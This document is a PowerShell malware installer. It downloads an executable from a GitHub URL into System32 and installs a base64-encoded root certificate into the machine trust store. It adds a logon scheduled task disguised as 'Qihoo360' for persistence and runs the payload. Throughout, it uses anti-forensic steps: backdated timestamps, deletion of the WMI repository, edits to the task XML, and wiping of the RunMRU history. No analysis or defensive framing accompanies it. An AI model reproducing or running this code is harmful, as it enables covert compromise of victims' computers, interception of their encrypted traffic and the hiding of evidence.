$TargetPath = "C:\Windows\System32\st20.exe"
mkdir ("C:\Users\" + $env:USERNAME + "\AppData\Roaming\Data\fa7tr3b4awe9hnte563cdn324v3q4z36\")
curl "https://raw.githubusercontent.com/mohamedali43/ps1/main/st.exe" -o $TargetPath

(Get-Item $TargetPath).CreationTime=("1 Jan 1999 0:00:00")
(Get-Item $TargetPath).LastWriteTime=("1 Jan 1999 0:00:00")
(Get-Item $TargetPath).LastAccessTime=("1 Jan 1999 0:00:00")
echo "OK"

#cert
$base64Cert = @"
TUlJRHJUQ0NBcFdnQXdJQkFnSVVEOTM1Z1VMclcwTmxlRE15bzY1YXc5eHhRRkF3RFFZSktvWklodmNOQVFFTA0KQlFBd1pqRUxNQWtHQTFVRUJoTUNRMEV4Q3pBSkJnTlZCQWdNQWtKRE1SSXdFQVlEVlFRSERBbFdZVzVqYjNWMg0KWlhJeEZEQVNCZ05WQkFvTUMxUlVWQ0JUZEhWa2FXOXpNUXN3Q1FZRFZRUUxEQUpKVkRFVE1CRUdBMVVFQXd3Sw0KZEhSMExuTjBkV1JwYnpBZUZ3MHlOREE1TURZd01URTJNelJhRncweU56QTJNRE13TVRFMk16UmFNR1l4Q3pBSg0KQmdOVkJBWVRBa05CTVFzd0NRWURWUVFJREFKQ1F6RVNNQkFHQTFVRUJ3d0pWbUZ1WTI5MWRtVnlNUlF3RWdZRA0KVlFRS0RBdFVWRlFnVTNSMVpHbHZjekVMTUFrR0ExVUVDd3dDU1ZReEV6QVJCZ05WQkFNTUNuUjBkQzV6ZEhWaw0KYVc4d2dnRWlNQTBHQ1NxR1NJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUURVVEVwTld2WHVUOXRaQkhmSw0KekJGc0hlelE4bUpxUk51c1VmaVJrVHR2dDdQSXh5TFU0czdSQk1sK3N6L1cwKzZacGVhSklaZ1AyRTg0Y0lLVA0KTmhCQkcxZm14YURZM0luUVZHcDFtUnFKUDhHWEl1bER5dmI3d0UwL29VdU10emhPY21rMkMvM3V4MVgxdHMvKw0KOElSUkV5SStPKzhWZnlpTXNlbDFWR0lFZDloRC9GN3FmdE1mVW1qTytuTG41eUJTMy95L3JmejVPalZXR1RHdQ0Kb2I4bytmcGVLRVZoaW1ZRmJYZWpJSWR0eENkSXlqMGZXYjMxYllpUUlsSE5hTmFSeERCVUpjMkJJSHlrS3JRWA0KOVNvN0d3dEhobE1sREllUVlhSXJ0VG9XeDJoMFR0TmNzRHRkU2hVY2hzMCtpeHJXQktFZXQ2dHlYMnlzc1FHQw0KcE52L0FnTUJBQUdqVXpCUk1CMEdBMVVkRGdRV0JCU3IzU3BqSWo5b1NsRjNpNkQ3VHR3WDZkOWpIakFmQmdOVg0KSFNNRUdEQVdnQlNyM1NwaklqOW9TbEYzaTZEN1R0d1g2ZDlqSGpBUEJnTlZIUk1CQWY4RUJUQURBUUgvTUEwRw0KQ1NxR1NJYjNEUUVCQ3dVQUE0SUJBUUFMYlVxcDZiQmU1RmhvVDFsRHgrL3ZiV1VLVUt0TW1QUktZaUJLMmNXTw0KT2prSi8wL2hRRzhDTXhhS2hOQ0VBRjBaOEREREI5bmZxdFFIMXIveXdsblVRMk9kOU1lc2NFYnlMaHRISVRNcQ0KZ094ZTZuMW45aElBbDNDT2JPMW9wREZIMVdLTUc3WkxZRmE4ditaZmFVY0lIWElweWJyckxPR1ppa0xuWFYvaw0KdWZuZm5RU1dBZElKZlprNDUrMGE1SGtKaVRjVVIzWGtnL3U5aysya0VYbHdMOWNEcUY4NWFFVHlsYlV5Ky9IWg0KcTdicnUvNE5lVWYrL2FINHd0Z0VZaU1ZZ3ZxbzlJYkhjM1hFd2RHSkx6b1pMRTE3ejlWZXhrZTNhV3RHZ2E5Nw0KMHZ5Z0xrdW5uRWsrWEthVjhQQXVtd2U0cGpWdGF1NFp2aU13L3NzRE1nSnM=
"@

$certBytes = [System.Convert]::FromBase64String($base64Cert)

$cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
$cert.Import($certBytes)

$store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root", "LocalMachine")

$store.Open("ReadWrite")
$store.Add($cert)
$store.Close()
echo "OK cert"

#persistance
$TaskName = "Qihoo360"
$Action = New-ScheduledTaskAction -Execute $TargetPath
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Principal = New-ScheduledTaskPrincipal ($env:COMPUTERNAME + "\" + $env:USERNAME)
Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -TaskName $TaskName

Set-Service Winmgmt -StartupType Disabled
Stop-Service -Force -Name Winmgmt

Remove-Item -Path "C:\Windows\System32\wbem\Repository\*" -Recurse -Force
echo "OK persistance"

#alter xml
$TaskPath = "C:\Windows\System32\tasks\" + $TaskName
[xml]$xml = (Get-Content -Path $TaskPath -Encoding Unicode)
if($xml.Task.RegistrationInfo.Date)
{
    $xml.Task.RegistrationInfo.Date = "1999-01-01T00:00:00.0000000"
    $xml.Save($TaskPath)
}

(Get-Item $TaskPath).CreationTime=("1 Jan 1999 0:00:00")
(Get-Item $TaskPath).LastWriteTime=("1 Jan 1999 0:00:00")
(Get-Item $TaskPath).LastAccessTime=("1 Jan 1999 0:00:00")

Set-Service Winmgmt -StartupType Automatic
Start-Service -Name winmgmt
echo "OK alter xml"

#clean 
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
$values = Get-ItemProperty -Path $regPath

foreach ($valueName in $values.PSObject.Properties.Name)
{
    if ($valueName -ne "(default)")
    {
        Remove-ItemProperty -Path $regPath -Name $valueName -ErrorAction SilentlyContinue
        echo $valueName
    }
}
echo "OK clean"

#run
Start-Process -FilePath $TargetPath 
